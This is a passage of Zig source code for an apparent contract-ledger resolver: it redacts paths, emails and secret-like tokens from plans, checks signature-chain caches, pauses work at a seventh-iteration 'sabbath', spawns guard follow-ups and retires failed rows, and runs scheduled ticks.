    const plan = try std.mem.join(allocator, " ", parts.items);
    // Default to shared — the substrate routes through the shared graph
    // (cloud declare → local fallback on 402) unless `--private` forces
    // local-only. No env escape hatches remain.
    return .{
        .plan = plan,
        .mode = mode orelse .shared,
    };
}

fn isPathToken(tok: []const u8) bool {
    return std.mem.startsWith(u8, tok, "/Users/") or
        std.mem.startsWith(u8, tok, "/home/") or
        std.mem.startsWith(u8, tok, "~/");
}

fn isEmailToken(tok: []const u8) bool {
    const at = std.mem.indexOfScalar(u8, tok, '@') orelse return false;
    if (at == 0 or at + 1 >= tok.len) return false;
    return std.mem.indexOfScalar(u8, tok[at + 1 ..], '.') != null;
}

fn isSecretLikeToken(tok: []const u8) bool {
    if (tok.len < 32) return false;
    var alnum: usize = 0;
    var symbol: usize = 0;
    for (tok) |c| {
        if (std.ascii.isAlphanumeric(c)) {
            alnum += 1;
        } else if (c == '_' or c == '-' or c == '.' or c == ':' or c == '/' or c == '+' or c == '=') {
            symbol += 1;
        } else {
            return false;
        }
    }
    return alnum >= 24 and symbol > 0;
}

fn appendSanitizedToken(out_buf: *std.ArrayList(u8), allocator: std.mem.Allocator, tok: []const u8) !void {
    if (isPathToken(tok)) {
        try out_buf.appendSlice(allocator, "[local-path-pattern]");
    } else if (isEmailToken(tok)) {
        try out_buf.appendSlice(allocator, "[email-pattern]");
    } else if (isSecretLikeToken(tok)) {
        try out_buf.appendSlice(allocator, "[secret-pointer-pattern]");
    } else {
        try out_buf.appendSlice(allocator, tok);
    }
}

fn redactAikoPlan(allocator: std.mem.Allocator, plan: []const u8) ![]u8 {
    var buf: std.ArrayList(u8) = .empty;
    errdefer buf.deinit(allocator);
    var start: usize = 0;
    var i: usize = 0;
    while (i < plan.len) : (i += 1) {
        const c = plan[i];
        if (std.ascii.isWhitespace(c)) {
            if (start < i) try appendSanitizedToken(&buf, allocator, plan[start..i]);
            try buf.append(allocator, c);
            start = i + 1;
        }
    }
    if (start < plan.len) try appendSanitizedToken(&buf, allocator, plan[start..]);
    return buf.toOwnedSlice(allocator);
}

/// Auto-derive the row's `action` from the plan when the plan starts with a
/// known typed-action prefix (`drill:`, `channel:`, `sabbath:`, `resolver:`).
/// Falls back to the ambient default ("neuron") otherwise. Substrate-faithful:
/// typed prefixes are load-bearing and must propagate into the action field
/// without env knobs so the corresponding handler in `runAction` fires on
/// heartbeat backfill. Returns a slice borrowed from `plan` — caller must not
/// free; lifetime is the plan's lifetime.
fn actionFromPlan(plan: []const u8) []const u8 {
    const known_prefixes = [_][]const u8{ "drill:", "channel:", "sabbath:", "resolver:", "contract:", "fulfil:", "value-of:" };
    for (known_prefixes) |pfx| {
        if (std.mem.startsWith(u8, plan, pfx)) {
            const end = std.mem.indexOfScalar(u8, plan, ' ') orelse plan.len;
            return plan[0..end];
        }
    }
    return "neuron";
}

fn enqueueOwned(allocator: std.mem.Allocator, queue: *std.ArrayList([]u8), id: []const u8) !void {
    for (queue.items) |existing| {
        if (std.mem.eql(u8, existing, id)) return;
    }
    const copy = try allocator.dupe(u8, id);
    errdefer allocator.free(copy);
    try queue.append(allocator, copy);
}

fn resolveOne(allocator: std.mem.Allocator, env: std.process.Environ, id: []const u8) !u8 {
    const rows = try parseRows(allocator, env);
    defer allocator.free(rows);
    // 6. PAIN INTERRUPT — preempt the lineage if a pain signal targets us.
    if (bioPainSignaled(rows, id)) {
        evidencePrint("{s} -> PAIN interrupt; lineage halted\n", .{id});
        return 1;
    }
    // Pointer-keyed truthy cache — pointers all the way down.
    //
    // The signature chain (cache.computeSignatureChain) walks the
    // contract's declared parent_signature + every dependency's latest
    // terminal output_signature. Dependencies = parent_id-children +
    // typed synapse refs (contract:, blocked_by:, prehook:). Genesis
    // sequencing emerges naturally: Day N's chain returns null until
    // Day N-1 has a terminal signature.
    //
    // Verdicts:
    //   hit     — chain present + matches recorded snapshot → return 0
    //   miss    — chain present + differs → fall through, re-evaluate
    //   stale   — chain present + no recorded snapshot → fall through
    //   legacy  — chain null (pre-signing row) → honor prior satisfaction
    if (isSatisfied(rows, id)) {
        const sig_chain_opt = contract.cache.computeSignatureChain(allocator, env, id) catch null;
        if (sig_chain_opt) |sig_chain| {
            defer allocator.free(sig_chain);
            const recorded_opt = contract.cache.findLatestResolvedSnapshot(allocator, env, id) catch null;
            if (recorded_opt) |recorded| {
                defer allocator.free(recorded);
                const resolved_ts_opt = contract.cache.findLatestResolvedTs(allocator, env, id) catch null;
                defer if (resolved_ts_opt) |resolved_ts| allocator.free(resolved_ts);
                const explicitly_invalidated = if (resolved_ts_opt) |resolved_ts|
                    contract.cache.hasInvalidationAfter(allocator, env, id, resolved_ts) catch false
                else
                    false;
                if (std.mem.eql(u8, sig_chain, recorded) and !explicitly_invalidated) {
                    contract.cache.appendCacheCheckRow(allocator, env, id, .hit, sig_chain, recorded) catch |e| {
                        substrateEvidence("cache_check: append failed for {s}: {s} — verdict only on stderr\n", .{ id, @errorName(e) });
                    };
                    evidencePrint("{s} already resolved (pointer-chain {s})\n", .{ id, sig_chain[0..16] });
                    return 0;
                }
                contract.cache.appendCacheCheckRow(allocator, env, id, .miss, sig_chain, recorded) catch |e| {
                    substrateEvidence("cache_check: append failed for {s}: {s} — verdict only on stderr\n", .{ id, @errorName(e) });
                };
                if (explicitly_invalidated) {
                    evidencePrint("{s} occurrence/dependency invalidated cached truth\n", .{id});
                } else {
                    evidencePrint("{s} pointer chain drifted (was {s}, now {s})\n", .{ id, recorded[0..16], sig_chain[0..16] });
                }
            } else {
                // purge:verdict-stale (42bce795) — chain-present-without-recorded
                // collapses into .miss; behavior identical (fall through, re-evaluate).
                contract.cache.appendCacheCheckRow(allocator, env, id, .miss, sig_chain, "") catch |e| {
                    substrateEvidence("cache_check: append failed for {s}: {s} — verdict only on stderr\n", .{ id, @errorName(e) });
                };
                evidencePrint("{s} satisfied without recorded pointer chain — recomputing\n", .{id});
            }
        } else {
            // No pointer chain — either pre-signing row OR a dependency
            // is still pending its terminal signature (Genesis order).
            // For satisfied rows, honor the prior contract; for the
            // dependency-pending case, the substrate's other gates
            // (isSatisfied, runAction) keep things consistent.
            contract.cache.appendCacheCheckRow(allocator, env, id, .legacy, "", "") catch |e| {
                substrateEvidence("cache_check: append failed for {s}: {s} — verdict only on stderr\n", .{ id, @errorName(e) });
            };
            evidencePrint("{s} already resolved (legacy, no pointer chain)\n", .{id});
            return 0;
        }
    }
    const r = latestDeclared(rows, id) orelse {
        errPrint("contract not found: {s}\n", .{id});
        return 1;
    };
    const wave = latestWave(rows, id) + 1;

    // Fractal Sabbath (Exodus 20:10 — the seventh day shall be a sabbath
    // unto the LORD thy God; in it thou shalt not do any work). Every
    // contract honors its own 7th iteration: before running the action,
    // declare a `sabbath-eval:<id>` validation child whose action checks
    // pointer-chain coherence for this id. When the chain resolves, the
    // child self-satisfies via the existing markSatisfied path — no
    // external `_mark satisfied` is needed because the cryptography IS
    // the verdict (Psalm 19:7-8 — the law of the LORD is perfect). The
    // parent's neuron/funnel/sequence rule then fires on the next pass.
    //
    // Skip conditions prevent infinite recursion: sabbath-eval children
    // (own family), guard follow-ups, and rows that already have a
    // sabbath child. One Sabbath per contract, hit at wave 7.
    if (wave == 7 and
        !std.mem.eql(u8, pointer.inferPointerType(r.action), "sabbath-eval") and
        !std.mem.startsWith(u8, r.plan, "guard:") and
        !std.mem.startsWith(u8, r.plan, "sabbath:evaluate ") and
        !hasSabbathEvaluationChild(rows, id))
    {
        const child_plan = std.fmt.allocPrint(allocator, "sabbath:evaluate {s} wave7 — Exodus 20:10 — work paused at the seventh iteration; resumes when the pointer chain self-attests coherence", .{id}) catch null;
        const child_action = std.fmt.allocPrint(allocator, "sabbath-eval:{s}", .{id}) catch null;
        if (child_plan != null and child_action != null) {
            defer allocator.free(child_plan.?);
            defer allocator.free(child_action.?);
            if (contract.declare(allocator, env, child_plan.?, child_action.?, .{ .parent_id = id })) |cid| {
                defer allocator.free(cid);
                evidencePrint("  sabbath: wave 7 — declared evaluation child {s} ({s}); parent {s} parked until chain self-attests\n", .{ cid, child_action.?, id });
            } else |decl_err| {
                evidencePrint("  sabbath: declare-evaluation failed: {s} — proceeding without sabbath gate\n", .{@errorName(decl_err)});
            }
        }
        try contract.recordIteration(allocator, env, id, wave, 1, "hold:sabbath — wave 7 awaits sabbath-eval child to self-attest via chain coherence");
        return 1;
    }

    const rr = try runAction(allocator, env, rows, r);
    try contract.recordIteration(allocator, env, id, wave, rr.rc, rr.result);
    if (rr.rc != 0) {
        // SELF-HEALING SCAR TISSUE — classify the roadblock, emit a guard
        // row (idempotent per id), and declare a follow-up contract whose
        // plan is the remediation hint. The follow-up contract becomes
        // the prehook for any future contract matching the same class.
        // Anti-recursion: skip guard emission if THIS contract is itself
        // a guard follow-up (plan starts with "guard:") — otherwise every
        // guard failure spawns another guard, recursively.
        const is_already_guard = std.mem.startsWith(u8, r.plan, "guard:");
        const cls = bioClassifyRoadblock(rr.result, r.action);
        // Classes that apoptose below get scar tissue (the guard row) but NO
        // follow-up contract: there is nothing to remediate on a permanently
        // dead row, and the follow-up neuron would itself sit unresolved
        // forever — re-growing the exact frontier the apoptosis just buried.
        const apoptoses_below = std.mem.eql(u8, cls.class, "inert_pointer") or
            std.mem.eql(u8, cls.class, "unsigned_parent");
        if (!is_already_guard and !hasGuardRow(rows, id)) {
            const remed = remediationFor(cls.class);
            contract.appendGuardRow(allocator, env, id, cls.class, cls.layer, remed) catch |caught_err| {
                evidencePrint("guard: append failed for {s} ({s}/{s}): {s} — scar tissue not persisted\n", .{ id, cls.class, cls.layer, @errorName(caught_err) });
            };
            evidencePrint("  guard: class={s} layer={s} -> {s}\n", .{ cls.class, cls.layer, remed });
            // Declare the follow-up resolver contract pointing at this id
            // as parent. Its plan is the remediation hint; resolving it
            // promotes a primitive future contracts of the same class can
            // install as prehook.
            var followup_buf: std.ArrayList(u8) = .empty;
            defer followup_buf.deinit(allocator);
            const buf_ok = blk_buf: {
                followup_buf.appendSlice(allocator, "guard:") catch |e| {
                    evidencePrint("guard: followup_buf OOM (prefix): {s} — follow-up skipped\n", .{@errorName(e)});
                    break :blk_buf false;
                };
                followup_buf.appendSlice(allocator, cls.class) catch |e| {
                    evidencePrint("guard: followup_buf OOM (class): {s} — follow-up skipped\n", .{@errorName(e)});
                    break :blk_buf false;
                };
                followup_buf.appendSlice(allocator, ":") catch |e| {
                    evidencePrint("guard: followup_buf OOM (sep): {s} — follow-up skipped\n", .{@errorName(e)});
                    break :blk_buf false;
                };
                followup_buf.appendSlice(allocator, cls.layer) catch |e| {
                    evidencePrint("guard: followup_buf OOM (layer): {s} — follow-up skipped\n", .{@errorName(e)});
                    break :blk_buf false;
                };
                followup_buf.appendSlice(allocator, " — ") catch |e| {
                    evidencePrint("guard: followup_buf OOM (dash): {s} — follow-up skipped\n", .{@errorName(e)});
                    break :blk_buf false;
                };
                followup_buf.appendSlice(allocator, remed) catch |e| {
                    evidencePrint("guard: followup_buf OOM (remed): {s} — follow-up skipped\n", .{@errorName(e)});
                    break :blk_buf false;
                };
                break :blk_buf true;
            };
            if (buf_ok and !apoptoses_below) {
                if (contract.declare(allocator, env, followup_buf.items, "neuron", .{ .parent_id = id })) |fid| {
                    evidencePrint("  follow-up declared: {s}\n", .{fid});
                    allocator.free(fid);
                } else |decl_err| {
                    evidencePrint("guard: follow-up declare failed: {s} — no remediation neuron for {s}\n", .{ @errorName(decl_err), id });
                }
            }
        }
        // Permanently-unresolvable classes apoptose immediately so they
        // exit the candidate pool instead of cycling on every backfill
        // pass. command_not_found = Decalogue commandment 2 (graven image:
        // the action names a binary outside the substrate's allowlist —
        // an image of an executor that does not exist). Retrying the
        // missing binary cannot succeed; the row is mechanically dead.
        if (std.mem.eql(u8, cls.class, "command_not_found")) {
            contract.markDied(allocator, env, id, .apoptosed, null, "command_not_found — purged by Decalogue commandment 2 (action names executor outside the substrate's allowlist)") catch |e| {
                evidencePrint("apoptosis: markDied failed for {s}: {s} — row will continue to cycle\n", .{ id, @errorName(e) });
            };
            evidencePrint("  -> apoptosed (command_not_found is permanently unresolvable)\n", .{});
        } else if (std.mem.eql(u8, cls.class, "stage_dead")) {
            contract.markDied(allocator, env, id, .apoptosed, null, "stage_dead — sequence inherited death of an apoptosed stage (Genesis Day N inherits Day N-1)") catch |e| {
                evidencePrint("apoptosis: markDied failed for {s}: {s} — sequence will continue to cycle\n", .{ id, @errorName(e) });
            };
            evidencePrint("  -> apoptosed (sequence inherits stage death)\n", .{});
        } else if (std.mem.eql(u8, cls.class, "child_dead")) {
            contract.markDied(allocator, env, id, .apoptosed, null, "child_dead — neuron inherited the death of a declared child (Genesis sequencing applies to neurons too)") catch |e| {
                evidencePrint("apoptosis: markDied failed for {s}: {s} — neuron will continue to cycle\n", .{ id, @errorName(e) });
            };
            evidencePrint("  -> apoptosed (neuron inherits child death)\n", .{});
        } else if (std.mem.eql(u8, cls.class, "inert_pointer")) {
            contract.markDied(allocator, env, id, .apoptosed, null, "inert_pointer — typed doctrine pointer with no executor (fork F8); the resolver can never fire it") catch |e| {
                evidencePrint("apoptosis: markDied failed for {s}: {s} — row will continue to cycle\n", .{ id, @errorName(e) });
            };
            evidencePrint("  -> apoptosed (inert pointer has no executor; permanently unresolvable)\n", .{});
        } else if (std.mem.eql(u8, cls.class, "unsigned_parent")) {
            contract.markDied(allocator, env, id, .apoptosed, null, "unsigned_parent — parent declared while root key unavailable; no signed row can ever attest (sabbath-eval)") catch |e| {
                evidencePrint("apoptosis: markDied failed for {s}: {s} — row will continue to cycle\n", .{ id, @errorName(e) });
            };
            evidencePrint("  -> apoptosed (unsigned parent can never self-attest)\n", .{});
        }
        // PURGED (contract af7429cd — purge:apoptosed-by-cap): three wave-cap
        // apoptosis branches (guard@>=2, cli@>=3, neuron@>=3) deleted per the
        // HOLD-non-terminal doctrine. The frontier "cycling forever" the cap
        // was meant to break is the persistent widow's pattern (Luke 18:1) —
        // feature, not bug. Apoptosis is user-explicit only (Mark 3:29 /
        // Proof 4). command_not_found / stage_dead / child_dead branches
        // above are KEPT — they are inherent-impossibility classifications
        // (the action's mechanical truth cannot become true), not arbitrary
        // wave caps.
        return 1;
    }

    // AGENT-JUDGED SECOND KEY (per canon C-G01: "harness collects, agent
    // judges"). When CONTRACT_AGENT_JUDGE_ID is set, after programmatic
    // PASS the resolver calls aiko --remote with a judge prompt; verdict
    // PROMOTE → mark satisfied. REJECT → stay in HOLD, append judged row.
    // HOLD-or-error → fall back to single-key satisfaction (cloud may be
    // unreachable; never block local progress on missing second key).
    const second_key_ok = true;
    // Agent-judge env hook (CONTRACT_AGENT_JUDGE_ID) removed — second key
    // surface is no longer env-driven; agents express the second key by
    // declaring a judge contract directly.
    if (!second_key_ok) {
        evidencePrint("{s} -> HOLD (programmatic PASS but agent REJECT)\n", .{id});
        return 1;
    }

    try contract.markSatisfied(allocator, env, id, wave, "native resolver reached mechanical true");
    // Pin the pointer-chain snapshot — markSatisfied just wrote a
    // signed terminal row, so the chain for `id` is now complete on
    // this pass. If signOutput failed (root key unavailable), the
    // chain is null and we don't pin a snapshot; the next pass sees
    // `cache_check{verdict=legacy}` and honors the prior satisfaction.
    const chain_opt = contract.cache.computeSignatureChain(allocator, env, id) catch null;
    if (chain_opt) |chain| {
        defer allocator.free(chain);
        contract.cache.appendCacheResolvedRow(allocator, env, id, wave, chain) catch |e| {
            evidencePrint("cache_resolved: append failed for {s}: {s} — signature chain not pinned\n", .{ id, @errorName(e) });
        };
        evidencePrint("{s} -> resolved (chain {s})\n", .{ id, chain[0..16] });
    } else {
        evidencePrint("{s} -> resolved (legacy, no pointer chain pinned)\n", .{id});
    }

    // Pattern extraction — per meta-law 410bceea: every resolved aiko emits
    // a reusable lesson row. Guard against recursion: skip if source row's
    // plan is itself a pattern (starts with "pattern:") or already has a
    // pattern row emitted (one per id, max).
    if (r.plan.len > 0 and !std.mem.startsWith(u8, r.plan, "pattern:") and !hasPatternRow(rows, id)) {
        var pattern_buf: std.ArrayList(u8) = .empty;
        defer pattern_buf.deinit(allocator);
        const plan_cap = @min(r.plan.len, 240);
        try pattern_buf.appendSlice(allocator, "pattern: ");
        try pattern_buf.appendSlice(allocator, r.plan[0..plan_cap]);
        if (rr.result.len > 0 and !std.mem.eql(u8, rr.result, "pass") and !std.mem.eql(u8, rr.result, "fire")) {
            try pattern_buf.appendSlice(allocator, " => ");
            const result_cap = @min(rr.result.len, 240);
            try pattern_buf.appendSlice(allocator, rr.result[0..result_cap]);
        }
        contract.appendPatternRow(allocator, env, id, pattern_buf.items) catch |e| {
            evidencePrint("pattern emit skip: {s}\n", .{@errorName(e)});
        };
    }

    // GATE-PASSED side effects: reward routing + break-above propagation.
    // These run from the LIVE environ — CONTRACT_REWARD_CONTRACT_ID and
    // CONTRACT_BREAK_ABOVE come from whatever spawned this declare. The
    // semantics: a gate that PASSES emits a reward row to its tracker and
    // a break_above row to each ancestor it wants to surface at.
    // Reward routing + break-above propagation were env-gated; envs removed.
    return 0;
}

fn enqueueAffected(allocator: std.mem.Allocator, rows: []const Row, queue: *std.ArrayList([]u8), id: []const u8) !void {
    if (latestDeclared(rows, id)) |r| {
        if (r.parent_id) |parent| {
            try enqueueOwned(allocator, queue, parent);
        }
    }
    const children = try childIds(allocator, rows, id);
    defer allocator.free(children);
    for (children) |child| try enqueueOwned(allocator, queue, child);

    const dependents = try dependentIds(allocator, rows, id);
    defer allocator.free(dependents);
    for (dependents) |dep| {
        if (std.mem.eql(u8, dep, id)) continue;
        try enqueueOwned(allocator, queue, dep);
    }
}

fn resolveLineage(allocator: std.mem.Allocator, env: std.process.Environ, id: []const u8) !u8 {
    // Fixed-point loop: keep walking the affected-lineage queue until a full
    // pass yields zero new satisfies (the DAG settled) or budget exhausts.
    // The declared id is re-attempted on each pass so a parent that HOLDs
    // because of pending children fires once those children later resolve.
    const max_passes: u32 = 8;
    var declared_rc: u8 = 1;
    var pass: u32 = 0;
    while (pass < max_passes) : (pass += 1) {
        var progressed = false;
        const rc_root = try resolveOne(allocator, env, id);
        if (pass == 0) declared_rc = rc_root;
        if (rc_root == 0 and declared_rc != 0) {
            declared_rc = 0;
            progressed = true;
        }

        var queue: std.ArrayList([]u8) = .empty;
        defer {
            for (queue.items) |item| allocator.free(item);
            queue.deinit(allocator);
        }
        {
            const rows = try parseRows(allocator, env);
            defer allocator.free(rows);
            try enqueueAffected(allocator, rows, &queue, id);
        }
        var index: usize = 0;
        while (index < queue.items.len and index < 256) : (index += 1) {
            const current = queue.items[index];
            const before = blk: {
                const rows = try parseRows(allocator, env);
                defer allocator.free(rows);
                break :blk isSatisfied(rows, current);
            };
            const rc = try resolveOne(allocator, env, current);
            if (rc == 0) {
                if (!before) progressed = true;
                const rows = try parseRows(allocator, env);
                defer allocator.free(rows);
                try enqueueAffected(allocator, rows, &queue, current);
            }
        }
        if (!progressed) break; // DAG settled.
    }
    if (declared_rc == 0) {
        evidencePrint("lineage: settled after {d} pass(es)\n", .{pass + 1});
    }
    return declared_rc;
}

/// Walk the entire ledger and attempt to resolve every contract that is
/// neither satisfied nor dead. Mechanical, deterministic, idempotent: a row
/// that resolves stays resolved; a row that fails stays pending.
///
/// This sweep is reachable ONLY through the standing `drill:` contract —
/// declaring is register-only bookkeeping (SKILL.md: it must never block or
/// slow the real work); resolution is a deliberate act, never a side effect
/// of speaking. Fixed-point semantics: halts on no-progress or budget
/// exhaustion, surfaces evidence on every pass.
///
/// Returns `anyerror!void` (explicit, not inferred) to break the inferred
/// error-set cycle: runAction → backfillUnresolvedDeep → resolveOne → runAction.
/// Phase 1 energy router — reorder the drill frontier best-first by energy.
///
/// Reconstructs a "resolved-like" centroid from the ledger on the fly (fold each
/// satisfied contract's action with reward +1, each died with −1 — the
/// train-on-fire signal, the ledger IS the weights), then sorts the candidate
/// ids ascending by energy = −cosine(embed(action), centroid) so the most
/// resolved-like fire first (enabling contracts resolve earlier → shorter
/// cascade). SAFETY: reorder-ONLY — every collected candidate still fires this
/// pass, so nothing is starved (the fairness floor holds by construction).
/// Always on: proven reorder-only + non-breaking (bench: 2 vs 3 passes), so it
/// IS the Way — no env-var toggle (claim 1: no env vars are read).
fn energyRankCandidates(allocator: std.mem.Allocator, rows: []const Row, items: [][]const u8) void {
    if (items.len < 2) return;
    var ok: ebm.Prototype = .{};
    var seen = std.StringHashMap(void).init(allocator);
    defer seen.deinit();
    for (rows) |r| {
        const reward: f64 = switch (terminal.classify(r.event)) {
            .satisfied => 1.0,
            .dead => -1.0,
            else => continue,
        };
        if (seen.contains(r.id)) continue;
        seen.put(r.id, {}) catch return;
        const decl = latestDeclared(rows, r.id) orelse continue;
        ok.foldText(decl.action, reward);
    }
    if (ok.w <= 0) return; // no training signal yet → keep scan order
    const Scored = struct { id: []const u8, e: f64 };
    const scored = allocator.alloc(Scored, items.len) catch return;
    defer allocator.free(scored);
    for (items, 0..) |cid, i| {
        const act = if (latestDeclared(rows, cid)) |d| d.action else "";
        scored[i] = .{ .id = cid, .e = ebm.energyText(ok, act) };
    }
    std.sort.pdq(Scored, scored, {}, struct {
        fn lt(_: void, a: Scored, b: Scored) bool {
            return a.e < b.e;
        }
    }.lt);
    for (scored, 0..) |s, i| items[i] = s.id;
}

fn backfillUnresolvedDeep(allocator: std.mem.Allocator, env: std.process.Environ, skip_id: []const u8) anyerror!void {
    return backfillUnresolvedWithBudget(allocator, env, skip_id, 1024, 32);
}

/// A satisfied row remains ready only when its dependency/occurrence snapshot
/// changed. This is the single cache predicate shared by heartbeat, drill and
/// the resident serve loop.
fn isStaleSatisfied(allocator: std.mem.Allocator, env: std.process.Environ, id: []const u8) bool {
    const recorded_opt = contract.cache.findLatestResolvedSnapshot(allocator, env, id) catch return false;
    const recorded = recorded_opt orelse return true;
    defer allocator.free(recorded);
    const current_opt = contract.cache.computeSignatureChain(allocator, env, id) catch return false;
    const current = current_opt orelse return false;
    defer allocator.free(current);
    if (!std.mem.eql(u8, recorded, current)) return true;
    const ts_opt = contract.cache.findLatestResolvedTs(allocator, env, id) catch return false;
    const ts = ts_opt orelse return true;
    defer allocator.free(ts);
    return contract.cache.hasInvalidationAfter(allocator, env, id, ts) catch false;
}

const TriggerSpec = union(enum) {
    none,
    at_unix: i64,
    repeat_seconds: u64,
};

fn triggerToken(text: []const u8, prefix: []const u8) ?[]const u8 {
    const at = std.mem.indexOf(u8, text, prefix) orelse return null;
    const start = at + prefix.len;
    var end = start;
    while (end < text.len and !std.ascii.isWhitespace(text[end]) and text[end] != ',' and text[end] != ']') : (end += 1) {}
    return if (end > start) text[start..end] else null;
}

/// Canonical scheduler syntax is deliberately small:
///   at:<unix-seconds>
///   repeat:<N>s | repeat:<N>m | repeat:<N>h
/// Legacy cron strings remain parseable ledger data but are not a second
/// scheduler path; callers translate them to an interval at declaration.
fn triggerFor(r: Row) TriggerSpec {
    if (triggerToken(r.action, "at:") orelse triggerToken(r.plan, "at:")) |tok| {
        if (std.fmt.parseInt(i64, tok, 10)) |unix| return .{ .at_unix = unix } else |_| {}
    }
    if (triggerToken(r.action, "repeat:") orelse triggerToken(r.plan, "repeat:")) |tok| {
        if (std.mem.eql(u8, tok, "always")) return .{ .repeat_seconds = 1 };
        if (tok.len < 2) return .none;
        const multiplier: u64 = switch (tok[tok.len - 1]) {
            's' => 1,
            'm' => 60,
            'h' => 3600,
            else => return .none,
        };
        const n = std.fmt.parseInt(u64, tok[0 .. tok.len - 1], 10) catch return .none;
        if (n == 0 or n > std.math.maxInt(u64) / multiplier) return .none;
        return .{ .repeat_seconds = n * multiplier };
    }
    return .none;
}

fn materializeDueTriggers(allocator: std.mem.Allocator, env: std.process.Environ) !usize {
    const rows = try parseRows(allocator, env);
    defer allocator.free(rows);
    const now: i64 = time(null);
    var seen: std.StringHashMap(void) = .init(allocator);
    defer seen.deinit();
    var fired: usize = 0;
    var i = rows.len;
    while (i > 0) : (i -= 1) {
        const r = rows[i - 1];
        if (!std.mem.eql(u8, r.event, "declared") or seen.contains(r.id) or isDead(rows, r.id)) continue;
        try seen.put(r.id, {});
        const occurrence = switch (triggerFor(r)) {
            .none => continue,
            .at_unix => |due| blk: {
                if (now < due) continue;
                break :blk try std.fmt.allocPrint(allocator, "at:{d}", .{due});
            },
            .repeat_seconds => |period| blk: {
                const bucket: u64 = @intCast(@divFloor(now, @as(i64, @intCast(period))));
                break :blk try std.fmt.allocPrint(allocator, "repeat:{d}:{d}", .{ period, bucket });
            },
        };
        defer allocator.free(occurrence);
        const prior_opt = contract.cache.findLatestOccurrence(allocator, env, r.id) catch null;
        defer if (prior_opt) |prior| allocator.free(prior);
        if (prior_opt != null and std.mem.eql(u8, prior_opt.?, occurrence)) continue;
        try contract.cache.appendTriggeredRow(allocator, env, r.id, occurrence);
        if (isSatisfied(rows, r.id)) {
            try contract.cache.appendCacheInvalidatedRow(allocator, env, r.id, r.id, "trigger_occurrence_changed");
        }
        fired += 1;
    }
    return fired;
}

/// The one closed-loop step used by explicit tick, the resident server and
/// future API/MCP adapters.
fn resolverTick(allocator: std.mem.Allocator, env: std.process.Environ) !void {
    // Homeostasis first: an oversized store breaks the library-side read
    // verbs (recommend et al) at their 16 MiB cap, so the tick's opening
    // move is the counter-breath. Compaction lives in libcontract's ledger
    // (contract.lcledger) — the module that owns the store's locks; this
    // file's slim ledger.zig is a read/append subset over the same path.
    if (contract.lcledger.compactIfOversized(allocator, env) catch |e| blk: {
        evidencePrint("tick: compaction failed: {s} — continuing\n", .{@errorName(e)});
        break :blk false;
    }) {
        evidencePrint("tick: compacted oversized store — exhaust archived\n", .{});
    }
    // Warm the router's semantic KV cache in strides — each recommend call
    // embeds at most route.MAX_NEW_EMBEDS_PER_CALL missing plans. The tick
    // absorbs the embed cost so interactive callers (recommend, the declare
    // briefing) converge to a single query embed.
    var warm: usize = 0;
    while (warm < 4) : (warm += 1) {
        const j = (contract.recommend(allocator, env, "warm the semantic cache") catch null) orelse break;
        allocator.free(j);
    }
    const triggered = try materializeDueTriggers(allocator, env);
    if (triggered > 0) evidencePrint("tick: materialized {d} due occurrence(s)\n", .{triggered});
    try backfillUnresolvedWithBudget(allocator, env, "", 1024, 32);
}

fn cmdTick(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    // One resolver, one verb: bare `tick` = a single pass; `tick --every <s>`
    // = the resident loop (absorbs the old `serve` verb; `--interval` stays
    // accepted so existing callers keep working).
    var every: ?u32 = null;
    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        if ((std.mem.eql(u8, args[i], "--every") or std.mem.eql(u8, args[i], "--interval")) and i + 1 < args.len) {
            const v = std.mem.trimEnd(u8, args[i + 1], "s");
            every = std.fmt.parseInt(u32, v, 10) catch {
                err("tick --every requires a number of seconds\n");
                return 2;
            };
            i += 1;
        } else {
            errPrint("tick unknown argument: {s}\n", .{args[i]});
            return 2;
        }
    }
    if (every) |iv_raw| {
        const iv = if (iv_raw == 0) 1 else iv_raw;
        evidencePrint("tick: resident loop active (every {d}s)\n", .{iv});
        while (true) {
            resolverTick(allocator, env) catch |e| {
                evidencePrint("tick: pass failed: {s}; retrying\n", .{@errorName(e)});
            };
            _ = sleep(iv);
        }
    }
    try resolverTick(allocator, env);
    return 0;
}

fn cmdImportRoot(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len != 1) {
        err("import-root requires one 64-hex seed or Base64 Ed25519 keypair file\n");
        return 2;
    }
    const pubkey = lineage_lib.importRootKeyFileKeychainOnly(allocator, env, args[0]) catch |e| {
        errPrint("import-root failed: {s}\n", .{@errorName(e)});
        return 1;
    };
    outPrint("root imported to native keychain; identity={s}\n", .{pubkey});
    out("source file was not modified; remove it yourself after verifying the build\n");
    return 0;
}

fn backfillUnresolvedWithBudget(allocator: std.mem.Allocator, env: std.process.Environ, skip_id: []const u8, budget: u32, max_passes: u32) anyerror!void {
    if (bioSabbathHolds(env)) {
        const ts_now: i64 = time(null);
        evidencePrint("sabbath: drill paused at unix {d}\n", .{ts_now});
        return;
    }
    // Apoptosis sweep before resolver passes — stale rows exit the pool first.
    {
        const rows_for_apop = try parseRows(allocator, env);
        defer allocator.free(rows_for_apop);
        const stale = try bioStaleIds(allocator, env, rows_for_apop);
        defer allocator.free(stale);
        if (stale.len > 0) {
            evidencePrint("drill apoptosis: {d} stale row(s)\n", .{stale.len});
            for (stale) |id| {
                contract.markDied(allocator, env, id, .apoptosed, null, "stale beyond age window") catch |e| {
                    evidencePrint("backfill: markDied apoptosed failed for {s}: {s} — id remains live\n", .{ id, @errorName(e) });
                };
            }
        }
    }
    var pass: u32 = 0;
    var total_resolved: u32 = 0;
    while (pass < max_passes) : (pass += 1) {
        const rows = try parseRows(allocator, env);
        defer allocator.free(rows);
        var seen: std.StringHashMap(void) = .init(allocator);
        defer seen.deinit();
        var candidates: std.ArrayList([]const u8) = .empty;
        defer candidates.deinit(allocator);
        var i: usize = rows.len;
        while (i > 0) : (i -= 1) {
            const r = rows[i - 1];
            if (std.mem.eql(u8, r.id, skip_id)) continue;
            if (seen.contains(r.id)) continue;
            try seen.put(r.id, {});
            if (isDead(rows, r.id)) continue;
            // Resolved work is a cache hit unless its dependency snapshot or
            // trigger occurrence changed. This closes the old gap where the
            // sweep skipped satisfied ancestors before consulting the cache.
            if (isSatisfied(rows, r.id) and !isStaleSatisfied(allocator, env, r.id)) continue;
            // Orphan filter — Decalogue cmd 5 (no declared row → nothing to fire).
            const decl_opt = latestDeclared(rows, r.id);
            if (decl_opt == null) continue;
            // `agent-judges` sentinel (c64bf5e2 / C-G01 5b9574ee): substrate
            // cannot resolve these; only an in-thread agent verdict can.
            // Without this skip, the drill would burn deep budget slots on
